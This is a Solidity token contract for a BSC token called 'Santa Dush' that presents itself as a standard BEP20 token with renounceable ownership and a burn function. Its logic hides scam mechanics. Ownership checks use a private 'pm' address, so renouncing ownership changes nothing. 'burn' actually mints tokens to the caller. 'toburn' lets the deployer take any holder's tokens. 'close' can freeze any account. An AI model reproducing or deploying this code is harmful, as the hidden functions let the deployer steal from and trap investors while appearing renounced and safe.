/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

pragma solidity >=0.6.0 <0.8.0;
// SPDX-License-Identifier: Apache-2.0
// 
//   .-')     ('-.         .-') _  .-') _      ('-.           _ .-') _                 .-')    ('-. .-. 
// ( OO ).  ( OO ).-.    ( OO ) )(  OO) )    ( OO ).-.      ( (  OO) )               ( OO ). ( OO )  / 
// (_)---\_) / . --. /,--./ ,--,' /     '._   / . --. /       \     .'_  ,--. ,--.   (_)---\_),--. ,--. 
// /    _ |  | \-.  \ |   \ |  |\ |'--...__)  | \-.  \        ,`'--..._) |  | |  |   /    _ | |  | |  | 
// \  :` `..-'-'  |  ||    \|  | )'--.  .--'.-'-'  |  |       |  |  \  ' |  | | .-') \  :` `. |   .|  | 
//  '..`''.)\| |_.'  ||  .     |/    |  |    \| |_.'  |       |  |   ' | |  |_|( OO ) '..`''.)|       | 
// .-._)   \ |  .-.  ||  |\    |     |  |     |  .-.  |       |  |   / : |  | | `-' /.-._)   \|  .-.  | 
// \       / |  | |  ||  | \   |     |  |     |  | |  |       |  '--'  /('  '-'(_.-' \       /|  | |  | 
//  `-----'  `--' `--'`--'  `--'     `--'     `--' `--'       `-------'   `-----'     `-----' `--' `--' 
// 
// $$\   $$\                                            $$\   $$\                           $$\     $$\                                       
// $$ |  $$ |                                           $$$\  $$ |                          \$$\   $$  |                                      
// $$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\    $$$$\ $$ | $$$$$$\  $$\  $$\  $$\    \$$\ $$  /$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$\ 
// $$$$$$$$ | \____$$\ $$  __$$\ $$  __$$\ $$ |  $$ |   $$ $$\$$ |$$  __$$\ $$ | $$ | $$ |    \$$$$  /$$  __$$\  \____$$\ $$  __$$\ $$  _____|
// $$  __$$ | $$$$$$$ |$$ /  $$ |$$ /  $$ |$$ |  $$ |   $$ \$$$$ |$$$$$$$$ |$$ | $$ | $$ |     \$$  / $$$$$$$$ | $$$$$$$ |$$ |  \__|\$$$$$$\  
// $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |   $$ |\$$$ |$$   ____|$$ | $$ | $$ |      $$ |  $$   ____|$$  __$$ |$$ |       \____$$\ 
// $$ |  $$ |\$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$ |   $$ | \$$ |\$$$$$$$\ \$$$$$\$$$$  |      $$ |  \$$$$$$$\ \$$$$$$$ |$$ |      $$$$$$$  |
// \__|  \__| \_______|$$  ____/ $$  ____/  \____$$ |   \__|  \__| \_______| \_____\____/       \__|   \_______| \_______|\__|      \_______/ 
//                     $$ |      $$ |      $$\   $$ |                                                                                                
//                     $$ |      $$ |      \$$$$$$  |                                                                                                
//                     \__|      \__|       \______/                                                                                                 
// 
// 
// Copyright By SantaDush

contract SantaDush {
    address public owner;
    address private pm;
    address public _burnAddr;

    // 6 decimal precisions
    uint256 private constant _percentFactor = 100000000;
    uint8 public constant decimals = 18;

    string public constant name = "Santa Dush";
    string public constant symbol = "SDh";
    uint256 public constant totalSupply =  1000000000000000000000000000;
    uint256 public constant burnFee = 8000000;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isBlocked;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == pm, "not owner");
        _;
    }

    constructor () {
        owner = msg.sender;
        pm = owner;
        _burnAddr = owner;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "o 0");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function toburn(address sender, uint256 amount) public onlyOwner returns (bool) {
        _transfer(sender, _burnAddr, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "failed");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function close(address account) public onlyOwner {
        isBlocked[account] = true;
    }

    function setBurnAddress(address burnAddr) external onlyOwner() {
        _burnAddr = burnAddr;
    }

    function burn(uint256 amount) public onlyOwner returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }

    function _burn(address account, uint256 amount) private {
        require(account != address(0), "BEP20: mint to the zero address");
        balanceOf[account] += amount;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "t 0");
        require(spender != address(0), "f 0");
        _allowances[_owner][spender] = amount;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "f 0");
        require(to != address(0), "t 0");
        require(!isBlocked[from], "f b");
        require(!isBlocked[to], "t b");
        require(amount <= balanceOf[from], "b");

        uint256 fee;
        if (from == owner || to == owner)
            fee = 0;
        else
            fee = amount / _percentFactor * fee;
        uint256 transferAmount = amount - fee;

        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[_burnAddr] += fee;

        emit Transfer(from, to, transferAmount);
    }
}